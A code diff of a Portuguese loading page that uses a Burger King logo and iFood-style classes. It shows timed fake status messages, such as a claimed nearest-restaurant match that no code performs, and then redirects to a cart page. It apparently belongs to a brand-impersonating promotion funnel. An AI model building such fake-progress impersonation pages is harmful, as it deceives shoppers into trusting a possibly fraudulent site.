@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Processando...</title>
-    <link rel="stylesheet" href="style.css?v=36">
+    <link rel="stylesheet" href="style.css?v=42">
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800;900&display=swap" rel="stylesheet">
 </head>
 <body>
@@ -14,36 +14,38 @@
                 <div class="ifood-spinner"></div>
             </div>
             <img src="https://www.burgerking.com.br/images/bklogos/BK-novo-logo.svg" alt="BK" style="height: 60px; margin-bottom: 20px; opacity: 0.8;">
-            <h2 id="loading-copy" class="loading-text-ifood">Buscando as melhores ofertas...</h2>
+            <h2 id="loading-copy" class="loading-text-ifood">Buscando restaurante mais próximo...</h2>
         </main>
     </div>
-    <script src="script_v7.js?v=35"></script>
+    <script src="script_v7.js?v=44" defer></script>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const el = document.getElementById('loading-copy');
-            const messages = [
-                'Localizando restaurante mais próximo...',
-                'Verificando disponibilidade de lanches...',
-                'Aplicando descontos exclusivos de aniversário...',
-                'Tudo pronto! Seu combo foi separado.'
-            ];
             
-            let i = 0;
-            const interval = setInterval(() => {
-                if (i < messages.length) {
-                    if (el) el.textContent = messages[i];
-                    i++;
-                } else {
-                    clearInterval(interval);
-                }
-            }, 800); // Muda a mensagem a cada 800ms
+            // Fase 1: Buscando... (2.5 segundos)
+            el.textContent = 'Buscando restaurante mais próximo do seu endereço...';
             
-            // REDIRECIONAMENTO BLINDADO V9.5
             setTimeout(() => {
-                console.log('Finalizando processamento e indo para a sacola...');
-                window.location.replace('sacola.html');
-            }, 3500); // 3.5 segundos para dar tempo de ler as mensagens
+                // Fase 2: Encontrado! (fade transition)
+                el.style.opacity = '0';
+                setTimeout(() => {
+                    el.textContent = 'Unidade mais próxima encontrada! ✅';
+                    el.style.color = '#16a34a';
+                    el.style.opacity = '1';
+                    
+                    // Redireciona após 1 segundo na mensagem de sucesso
+                    setTimeout(() => {
+                        window.location.replace('sacola.html');
+                    }, 1000);
+                }, 200);
+            }, 2500);
         });
     </script>
+    <style>
+        #loading-copy {
+            transition: opacity 0.15s ease;
+        }
+    </style>
 </body>
 </html>
+
